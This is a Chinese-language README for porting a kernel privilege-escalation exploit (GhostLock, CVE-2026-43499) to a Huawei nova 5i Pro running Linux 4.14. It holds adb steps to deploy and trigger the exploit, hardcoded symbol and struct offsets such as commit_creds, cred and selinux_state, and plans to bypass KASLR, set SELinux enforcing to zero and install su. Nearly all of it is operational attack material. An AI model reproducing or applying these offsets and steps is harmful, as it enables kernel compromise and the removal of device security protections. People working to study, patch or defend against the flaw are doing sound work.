# GhostLock (CVE-2026-43499) — HUAWEI TEL-AN10 4.14 适配说明

## 一、目标设备

| 项 | 值 |
|---|---|
| 设备 | HUAWEI TEL-AN10 (nova 5i Pro, Kirin 810, 代号 denver) |
| 内核 | Linux 4.14.116+ (`merge_denver_defconfig`) |
| 架构 | ARM64, 39-bit VA, 4KB 页 |
| 基址 | `KIMAGE_TEXT_BASE = 0xffffff8008080000` (`_text`) |

## 二、已生成文件

```
repo3/
├── target.h            # 4.14 偏移配置 (符号 + 结构体)
├── exploit.c           # GhostLock 提权 exploit (已适配 4.14)
├── trigger.c           # 漏洞验证 PoC (EDEADLK + UAF 探测)
├── Makefile            # Termux clang / NDK 均可编译
├── root.sh             # adb 分阶段部署脚本
├── ghostlock_trigger   # 已编译 (aarch64 Android PIE)
├── ghostlock_exploit   # 已编译 (aarch64 Android PIE)
└── System.map          # 手机 BOOT 内核符号表 (偏移来源)
```

编译: `make` (默认用 Termux clang, 或 `make NDK_ROOT=...`)

## 三、使用步骤 (adb)

```bash
# 1. 连接手机 (USB 调试), 确认可见
adb devices -l

# 2. 环境检查: 内核版本/kallsyms/boot_id/perf/selinux
./root.sh info

# 3. 推送二进制
./root.sh deploy

# 4. 验证漏洞 (⚠️ 存在漏洞则手机 panic 重启, 属正常现象)
CONFIRM=yes ./root.sh trigger
#    设备重启          -> 漏洞存在 ✓
#    输出 "UAF probe returned" -> 内核已修补 ✗

# 5. 验证写原语 (DEBUG_MODE=1, 写特征值 0xdead0000dead0000)
CONFIRM=yes ./root.sh debug
#    panic 地址含 0xdead -> 任意写成功 ✓

# 6. 提权: 修改 exploit.c 中 DEBUG_MODE 0, 重新 make, 再跑
CONFIRM=yes ./root.sh root

# 7. 验证
./root.sh verify
```

⚠️ 每步都可能 panic/重启手机; root 是临时的, 重启后失效。

## 四、偏移来源与验证状态

### 符号偏移 (来自 repo3/System.map, 即手机 BOOT 内核)

| 符号 | 地址 | 相对偏移 |
|---|---|---|
| `_text` | ffffff8008080000 | 0 |
| `commit_creds` | ffffff80080ee380 | 0x0006e380 |
| `prepare_kernel_cred` | ffffff80080ee6f8 | 0x0006e6f8 |
| `init_task` | ffffff800a45c640 | 0x023dc640 |
| `init_cred` | ffffff800a46c668 | 0x023ec668 |
| `init_nsproxy` | ffffff800a46c4f0 | 0x023ec4f0 |
| `init_net` | ffffff800a8fc5c0 | 0x0287c5c0 |
| `init_uts_ns` | ffffff800a45c3e8 | 0x023dc3e8 |
| `anon_pipe_buf_ops` | ffffff800996bb00 | 0x018ebb00 |
| `pipe_read` | ffffff80082e4320 | 0x00264320 |
| `pipe_write` | ffffff80082e4628 | 0x00264628 |
| `generic_file_splice_read` | ffffff80083192d8 | 0x002992d8 |
| `generic_file_llseek` | ffffff80082d6818 | 0x00256818 |
| `noop_llseek` | ffffff80082d6a38 | 0x00256a38 |
| `no_llseek` | ffffff80082d6a40 | 0x00256a40 |
| `generic_file_read_iter` | ffffff8008243200 | 0x001c3200 |
| `generic_file_write_iter` | ffffff80082452a8 | 0x001c52a8 |
| `configfs_read_file` | ffffff80083958e0 | 0x003158e0 |
| `configfs_write_file` | ffffff8008395a00 | 0x00315a00 |
| `configfs_open_file` | ffffff8008395bb8 | 0x00315bb8 |
| `configfs_release` | ffffff8008395bd0 | 0x00315bd0 |
| `configfs_read_bin_file` | ffffff8008395c10 | 0x00315c10 |
| `configfs_write_bin_file` | ffffff8008395d90 | 0x00315d90 |
| `ashmem_fops` | ffffff8009ac15a0 | 0x01a415a0 |
| `ashmem_ioctl` | ffffff8008dd7f38 | 0x00d57f38 |
| `ashmem_mmap` | ffffff8008dd88b8 | 0x00d588b8 |
| `kmalloc_caches` | ffffff800a058888 | 0x01fd8888 |
| `selinux_state` | ffffff800b1a8000 | 0x03128000 |
| `security_hook_heads` | ffffff800a058d88 | 0x01fd8d88 |
| `empty_zero_page` | ffffff800a96e000 | 0x028ee000 |
| `root_task_group` | ffffff800a974dc0 | 0x028f4dc0 |
| `kptr_restrict` | ffffff800a45bf18 | 0x023dbf18 |
| `modprobe_path` | ffffff800a46cc88 | 0x023ecc88 |
| `core_pattern` | ffffff800a49d810 | 0x0241d810 |
| `core_pipe_limit` | ffffff800a9be5c8 | 0x0293e5c8 |
| `sysctl_bootid` | ffffff800ab65884 | 0x02ae5884 |
| `nfulnl_logger` | ffffff800a4527d0 | 0x023d27d0 |
| `nf_log loggers` | ffffff800a4526f8 | 0x023d26f8 |
| `rt_mutex_start_proxy_lock` | ffffff800814cb78 | 0x000ccb78 |
| `remove_waiter` | ffffff800814cc08 | 0x000ccc08 |
| `futex_requeue` | ffffff8008192680 | 0x00112680 |
| `memstart_addr` | ffffff800a058708 | 0x01fd8708 |
| `kimage_voffset` | ffffff800a058718 | 0x01fd8718 |
| `linux_banner` | ffffff8009600018 | 0x01580018 |

注: 4.14 内核无 `ashmem_misc_fops`/`copy_splice_read`/`futex_wait_requeue_pi`
独立符号 (前者直接 `misc_register(&ashmem_fops)`, splice 用
`generic_file_splice_read`)。

### 结构体偏移 (来自 opensource vmlinux 的 DWARF, 4.14.116)

| 结构体 | 大小 | 关键成员 |
|---|---|---|
| task_struct | 0x10c0 | thread_info 0x0, prio 0x130, tasks 0x6b0, pid 0x7b0, tgid 0x7b4, real_parent 0x7c0, real_cred 0x970, cred 0x978, comm 0x980, seccomp 0xa28, pi_lock 0xa60, pi_waiters 0xa80, pi_top_task 0xa90, **pi_blocked_on 0xa98** |
| cred | 0xa8 | uid 0x4, gid 0x8, securebits 0x24, caps 0x28..0x48, **security 0x78** |
| rt_mutex_waiter | 0x50 | tree_entry 0x0, pi_tree_entry 0x18, task 0x30, lock 0x38, **prio 0x40, deadline 0x48** (无 wake_state/ww_ctx!) |
| pipe_buffer | 0x28 | page 0x0, offset 0x8, len 0xc, ops 0x10, flags 0x18, private 0x20 |
| pipe_inode_info | 0xb8 | mutex 0x0, wait 0x40, **nrbufs 0x68, curbuf 0x6c, buffers 0x70** (无 head/tail!), bufs 0xa8 |
| configfs_buffer | 0x90 | page 0x10, needs_read_fill 0x60, **bin_buffer 0x68, bin_buffer_size 0x70, cb_max_size 0x74** |
| file_operations | 0xf0 | llseek 0x8, read 0x10, write 0x18, read_iter 0x20, write_iter 0x28, unlocked_ioctl 0x48, compat_ioctl 0x50, mmap 0x58, open 0x60, release 0x70, splice_read 0xb8, show_fdinfo 0xd0 |
| seccomp | 0x10 | mode 0x0, filter 0x8 |
| mm_struct | 0x3c0 | mmap 0x0, pgd 0x40, saved_auxv 0x178, exe_file 0x370 |
| futex_q | 0x70 | list 0x0, task 0x28, lock_ptr 0x30, key 0x38, pi_state 0x50, rt_waiter 0x58 |
| struct page | 0x40 | flags 0x0, mem_cgroup 0x38 |

⚠️ **4.14 与 4.19 的差异点** (已按 4.14 修正, 勿复用 4.19 值):
- task_struct: 4.19 `cred@0x760/pi_blocked_on@0x850` vs 4.14 `cred@0x978/pi_blocked_on@0xa98`
- rt_mutex_waiter: 4.19 有 wake_state/ww_ctx, 4.14 是 prio/deadline
- pipe_inode_info: 4.19 有 head/tail, 4.14 是 nrbufs/curbuf/buffers
- configfs: 4.19 有 read_iter/write_iter, 4.14 是 read/write (configfs_read_file 等)
- file_operations: ioctl 在 0x48 (4.14) vs 0x50 (4.19)

## 五、重要注意事项 (真机验证时逐项确认)

1. **kallsyms 可读性**: 若 `./root.sh info` 显示 `/proc/kallsyms` 地址全为
   0, 则运行时符号解析失败, exploit 会回退到硬编码偏移, 需要 KASLR slide
   泄漏 (boot_id 面已就绪, 符号在 target.h)。
2. **KASLR**: `CONFIG_RANDOMIZE_BASE=y` (memstart seed, 512MB/1GB 粒度)。
   若华为 bootloader 不提供 kaslr-seed, 实际无偏移, 硬编码基址可用。
3. **SELinux**: enforcing, 提权后需把 `selinux_state.enforcing` 写 0
   (target.h 已给偏移, 布局需设备验证: bool enforcing 在 offset 1)。
4. **perf 限制**: `CONFIG_SECURITY_PERF_EVENTS_RESTRICT=y`, shell 无
   CAP_PERFMON, repo2 完整链的 perf tracepoint 回收机制在出厂系统上
   大概率不可用 — 这是完整提权链移植的最大障碍。
5. **System.map 与 opensource vmlinux 不是同一构建**: 结构体偏移来自
   opensource 构建 (同源码同配置), 若手机实际内核与此有差异, 偏移需
   用 `extract_struct_offsets.py` 重新提取。

## 六、后续完整链 (参考 repo2 xpad2, 需要真机迭代)

完整 root 需要: slide (boot_id) -> 页表物理读写 (physrw) -> 遍历 task 列表
改 cred -> selinux enforcing 写 0 -> 安装 su。repo2 在 4.19 上实现了全套,
移植到 4.14 需要: kernelsnitch futex 哈希表时序 (4.14 有 futex_hash,
兼容), perf 计数器 (被限制, 需替代方案), 4.14 页表布局适配。
